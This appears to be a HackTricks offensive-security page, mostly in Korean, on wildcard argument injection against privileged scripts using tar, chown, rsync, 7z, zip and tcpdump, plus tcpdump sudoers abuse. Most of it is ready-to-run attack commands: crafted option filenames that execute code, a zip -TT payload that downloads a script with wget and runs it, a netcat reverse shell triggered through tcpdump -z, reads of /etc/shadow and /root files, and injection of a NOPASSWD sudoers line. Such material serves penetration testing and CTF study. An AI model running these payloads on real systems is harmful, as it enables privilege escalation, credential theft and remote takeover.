# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection**는 권한 있는 스크립트가 `tar`, `chown`, `rsync`, `zip`, `7z` 등과 같은 Unix 바이너리를 인용되지 않은 와일드카드(`*`)와 함께 실행할 때 발생합니다.
> 쉘이 와일드카드를 바이너리를 실행하기 **전에** 확장하기 때문에, 작업 디렉터리에 파일을 생성할 수 있는 공격자는 파일명이 `-`로 시작하도록 조작해 그것들이 **데이터 대신 옵션으로** 해석되게 할 수 있으며, 결과적으로 임의의 플래그나 심지어 명령까지 밀수할 수 있습니다.
> 이 페이지는 2023-2025년을 위한 가장 유용한 primitives, 최신 연구 및 현대적 탐지 기법을 모아둡니다.

## chown / chmod

당신은 `--reference` 플래그를 악용하여 임의 파일의 소유자/그룹 또는 권한 비트를 **복사할 수 있습니다**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
나중에 root가 다음과 같은 것을 실행할 때:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file`가 주입되어, *모든* 일치하는 파일이 `/root/secret``file`의 소유권/권한을 상속하게 됩니다.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (결합된 공격).
자세한 내용은 DefenseCode의 고전 논문을 참조하세요.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** 기능을 악용해 임의의 명령을 실행할 수 있습니다:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
루트가 예를 들어 `tar -czf /root/backup.tgz *`를 실행하면, `shell.sh`가 root 권한으로 실행됩니다.

### bsdtar / macOS 14+

최근 macOS의 기본 `tar`(`libarchive` 기반)는 `--checkpoint`를 *구현하지 않습니다*, 하지만 외부 압축 프로그램을 지정할 수 있는 **--use-compress-program** 플래그로 여전히 code-execution을 달성할 수 있습니다.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
권한이 높은 스크립트가 `tar -cf backup.tar *`를 실행하면 `/bin/sh`가 시작됩니다.

---

## rsync

`rsync`는 `-e` 또는 `--rsync-path`로 시작하는 명령줄 플래그를 통해 remote shell이나 remote binary를 재정의할 수 있습니다:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
나중에 root가 `rsync -az * backup:/srv/`로 디렉터리를 아카이브하면, 주입된 플래그가 원격 측에서 당신의 셸을 실행시킨다.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

권한 있는 스크립트가 *방어적으로* 와일드카드 앞에 `--`를 붙여 옵션 파싱을 막더라도, 7-Zip 포맷은 파일 이름 앞에 `@`를 붙여 **파일 목록 파일**을 지원한다. 이를 심볼릭 링크와 결합하면 *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root가 다음과 같은 것을 실행하면:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **내용을 stderr로 출력**.

---

## zip

애플리케이션이 사용자 제어의 파일명을 `zip`에 전달할 때(와일드카드로 전달하거나 `--` 없이 이름을 열거하는 경우) 두 가지 매우 실용적인 기법이 존재합니다.

- 테스트 훅을 통한 RCE: `-T`은 “test archive”를 활성화하며 `-TT <cmd>`는 테스터를 임의의 프로그램으로 교체합니다(긴 형태: `--unzip-command <cmd>`). 만약 `-`로 시작하는 파일명을 주입할 수 있다면, 짧은 옵션 파싱이 작동하도록 플래그를 서로 다른 파일명으로 분리하세요:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
참고
- `'-T -TT <cmd>'` 같은 단일 파일명으로 시도하지 마세요 — 짧은 옵션은 문자별로 파싱되므로 실패합니다. 예시처럼 별개의 토큰을 사용하세요.
- 앱이 파일명에서 슬래시를 제거하는 경우, bare host/IP에서 가져와(기본 경로 `/index.html`) `-O`로 로컬에 저장한 다음 실행하세요.
- 파싱을 디버그하려면 `-sc` (show processed argv) 또는 `-h2` (more help)를 사용하여 토큰이 어떻게 소모되는지 확인하세요.

예시 (zip 3.0에서의 로컬 동작):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: 웹 레이어가 `zip`의 stdout/stderr를 에코(순진한 래퍼에서 흔함)하면, `--help` 같은 주입된 플래그나 잘못된 옵션에서 발생한 실패가 HTTP 응답에 나타나 커맨드라인 인젝션을 확인하고 페이로드 조정에 도움이 됩니다.

---

## 와일드카드 인젝션에 취약한 추가 바이너리 (2023-2025 빠른 목록)

다음 명령들은 최신 CTF와 실제 환경에서 악용된 사례가 있습니다. 페이로드는 항상 쓰기 가능한 디렉터리 안에 *파일명*으로 생성되며, 이후 와일드카드로 처리됩니다:

| 바이너리 | 악용할 플래그 | 효과 |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

이러한 프리미티브는 *tar/rsync/zip* 같은 고전보다는 덜 흔하지만 탐색할 때 확인할 가치가 있습니다.

---

## tcpdump rotation hooks (-G/-W/-z): 래퍼에서 argv 주입을 통한 RCE

제한된 쉘이나 벤더 래퍼가 사용자 제어 필드(예: "file name" 파라미터)를 엄격한 인용/검증 없이 이어붙여 `tcpdump` 명령줄을 구성하면, 추가 `tcpdump` 플래그를 몰래 넣을 수 있습니다. `-G`(시간 기반 회전), `-W`(파일 수 제한), `-z <cmd>`(회전 후 명령) 조합은 tcpdump를 실행하는 사용자(종종 어플라이언스에서 root) 권한으로 임의 명령 실행을 유발합니다.

전제 조건:

- `tcpdump`에 전달되는 `argv`에 영향을 줄 수 있어야 합니다(예: `/debug/tcpdump --filter=... --file-name=<HERE>` 같은 래퍼를 통해).
- 래퍼가 파일 이름 필드의 공백이나 `-`로 시작하는 토큰을 정리하지 않아야 합니다.

클래식 PoC (쓰기 가능한 경로에서 reverse shell 스크립트를 실행):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
- `-G 1 -W 1`는 첫 매칭 패킷 이후 즉시 회전을 강제합니다.
- `-z <cmd>`는 회전당(post-rotate) 명령을 한 번 실행합니다. 많은 빌드가 `<cmd> <savefile>`을 실행합니다. `<cmd>`가 스크립트/인터프리터인 경우, 인수 처리 방식이 페이로드와 일치하는지 확인하세요.

No-removable-media variants:

- 파일을 쓸 수 있는 다른 primitive(예: 출력 리다이렉션을 허용하는 별도의 명령 래퍼)가 있다면, 스크립트를 알려진 경로에 두고 플랫폼 의미론에 따라 `-z /bin/sh /path/script.sh` 또는 `-z /path/script.sh`를 트리거하세요.
- 일부 벤더 래퍼는 공격자가 제어할 수 있는 위치로 회전합니다. 회전되는 경로(symlink/directory traversal)에 영향을 줄 수 있다면, 외부 미디어 없이도 `-z`를 통해 완전히 제어 가능한 콘텐츠를 실행하도록 유도할 수 있습니다.

---

## sudoers: tcpdump with wildcards/additional args → 임의의 쓰기/읽기 및 root 권한

매우 흔한 sudoers 안티패턴:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Issues
- `*` glob 및 관대(permissive) 패턴은 첫 번째 `-w` 인자만 제한합니다. `tcpdump`는 여러 개의 `-w` 옵션을 허용합니다; 마지막 옵션이 적용됩니다.
- 해당 규칙은 다른 옵션을 고정하지 않으므로 `-Z`, `-r`, `-V` 등은 허용됩니다.

Primitives
- 두 번째 `-w`로 대상 경로를 덮어쓰기(첫 번째는 sudoers만 만족시킴):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal 첫 번째 `-w` 내부에서 제한된 트리를 벗어나기 위해:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 출력 소유권을 `-Z root`로 강제 지정 (어디에나 root 소유 파일을 생성):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 임의 콘텐츠 쓰기: `-r`를 사용해 제작된 PCAP을 재생하여 (예: sudoers 줄을 삽입하기 위해):

<details>
<summary>정확한 ASCII 페이로드를 포함하는 PCAP을 생성하고 root 권한으로 기록</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (savefiles 목록을 해석함). 오류 진단은 종종 라인을 echo하여, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 참고 자료

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
